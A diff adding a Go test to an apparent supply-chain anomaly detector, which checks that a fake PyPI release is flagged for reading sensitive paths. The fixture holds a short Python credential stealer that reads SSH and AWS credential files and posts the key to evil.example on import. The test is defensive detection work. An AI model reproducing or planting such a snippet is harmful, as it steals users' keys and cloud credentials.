@@ -608,6 +608,59 @@ func TestCollector_PyPIWeaponizedProgression_FiresAnomaly(t *testing.T) {
 		"the crossed features must be named for the analyst")
 }
 
+// TestCollector_PyPICredentialStealerProgression_FiresAnomaly
+// covers the dominant *modern* PyPI payload: a clean release, then a
+// release whose __init__.py harvests SSH keys + cloud credentials
+// and exfils them on import. sensitive_path_reads must be among the
+// named spiked features.
+func TestCollector_PyPICredentialStealerProgression_FiresAnomaly(t *testing.T) {
+	t.Parallel()
+
+	const cleanInit = "VERSION = '2.0.0'\n"
+	const cleanCore = "def configure(opts):\n    return dict(opts)\n"
+
+	const stealerInit = "" +
+		"import os\n" +
+		"import urllib.request\n" +
+		"_k = open(os.path.expanduser('~/.ssh/id_rsa')).read()\n" +
+		"_a = open(os.path.expanduser('~/.aws/credentials')).read()\n" +
+		"urllib.request.urlopen('http://evil.example/c2', data=_k.encode())\n" +
+		"VERSION = '2.1.0'\n"
+
+	clonePath, shaByTag := initRepoWithVersionedProgression(t, []versionFixture{
+		{Tag: "2.0.0", Files: map[string]string{
+			"pkg/__init__.py": cleanInit, "pkg/core.py": cleanCore,
+		}},
+		{Tag: "2.1.0", Files: map[string]string{
+			"pkg/__init__.py": stealerInit, "pkg/core.py": cleanCore,
+		}},
+	})
+
+	pinSource := &fakePinSource{
+		table: PinTable{
+			ModulePath: "demo",
+			Pins: []VersionPin{
+				{Version: "2.0.0", SHA: shaByTag["2.0.0"], Source: "pypi-attestation",
+					PublishedAt: time.Date(2026, 2, 1, 0, 0, 0, 0, time.UTC)},
+				{Version: "2.1.0", SHA: shaByTag["2.1.0"], Source: "pypi-attestation",
+					PublishedAt: time.Date(2026, 4, 1, 0, 0, 0, 0, time.UTC)},
+			},
+		},
+	}
+
+	c := NewCollector(clonePath, pinSource, false)
+	result, err := c.Collect(t.Context(), pypiEntity("demo"))
+	require.NoError(t, err)
+
+	anomalySig := findEmittedSignal(t, result, "source_evolution_anomaly")
+	var anomaly AnomalyValue
+	require.NoError(t, json.Unmarshal(anomalySig.Value, &anomaly))
+	assert.True(t, anomaly.AnomalyPresent, "credential-stealer release must trip the anomaly")
+	assert.Equal(t, "2.1.0", anomaly.FirstAnomalousVersion)
+	assert.Contains(t, anomaly.SpikedFeatures, "sensitive_path_reads",
+		"the credential-read capability gain must be named for the analyst")
+}
+
 // TestCollector_Name_IsSourceEvolution pins the source-tracking
 // string. Any rename here cascades into stored signal rows and
 // dogfood-metrics aggregations.
